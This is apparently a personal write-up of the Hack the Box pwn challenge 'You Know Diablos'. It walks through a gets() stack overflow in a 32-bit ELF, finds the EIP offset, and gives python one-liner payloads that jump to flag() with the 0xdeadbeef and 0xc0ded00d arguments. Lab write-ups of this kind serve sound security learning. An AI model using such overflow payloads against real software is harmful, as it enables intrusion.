# Hack the Box - PWN - You Know Diablos

## Download and File Checks

- Downloaded a single file : vuln
- File type: ELF 32 bit LSB, dynamically linked, not stripped
- Notable strings: "main", "vuln", "gets", "puts", "fopen", "file.txt"
	- gets is a vunerable function (!)
- checksec:
	- Arch:     i386-32-little
    - RELRO:    Partial RELRO
    - Stack:    No canary found
    - NX:       NX disabled
    - PIE:      No PIE (0x8048000)
    - RWX:      Has RWX segments

## Runtime analysis

- Prompts with "You know who are 0xDiablos: "
- Waits for stdin and echos user input
- Seems to be vulnerable to buffer overflow

## Disassembly and GDB

- main function uses puts() to prompt the user then calls vuln
- vuln contains a call to gets() and puts(), likely to get user input then echo what they gave
- vuln allocates a 180 byte buffer at this instruction
	- sub    esp,0xb4
	- 0xb4 == 0d180

### Finding offset of instruction pointer (eip)

- Input 180 A's then follow with alphabetically ascending values
```sh
$ python -c 'print("A"*180+"BCDEFGHIJKLMNO...")'
```
- After giving this input, EIP is overwritten with JKLM
	- **eip offset is 8 bytes**

- Disassembling flag() function gets us the address of 0x080491e2

### Beginning Exploit

- With this information in hand, we can redirect execution to the flag function
- **Recall that the eip offset is 8 bytes, so we must now input 188 instead of 180**
- Also, vuln is little endian, so reverse the address for flag()

```sh
$ python -c 'import sys; sys.stdout.buffer.write(b"A"*188+b"\xe2\x91\x04\x08")' | ./vuln
```
- This prints "Hurry up and try it on server side", but nothing about the flag
- Creating a local flag.txt file doesn't do anything either

## Further look into assembly

- flag() function has two comparison instructions
	- cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   	- jne    0x8049269 \<flag+135\>
   	- cmp    DWORD PTR \[ebp+0xc\],0xc0ded00d
   	- jne    0x804926c \<flag+138\>
- These are literal comparisons with the second operands' hex values
- jne (jump if not equal) will jump past a call to printf (flag+125) that likely prints flag

- Seeing that vuln uses 4-byte addressability, the first operands in each compare should be parameters of the flag() functions
- **ebp+0x4 is the saved return address**
	- need to give some random return address before passing parameters (in payload)


## Finishing Exploit

- With this additional information, we can add parameters to the stack that should match the comparisons
- Again, this is little endian, so the parameter values must be reversed
```sh
$ python -c 'import sys; sys.stdout.buffer.write(b"A"*188+b"\xe2\x91\x04\x08"+b"retu"+b"\xef\xbe\xad\xde\x0d\xd0\xde\xc0")' | ./vuln
```
- **This workds locally!**
- See you_know_diablos.py for remote solution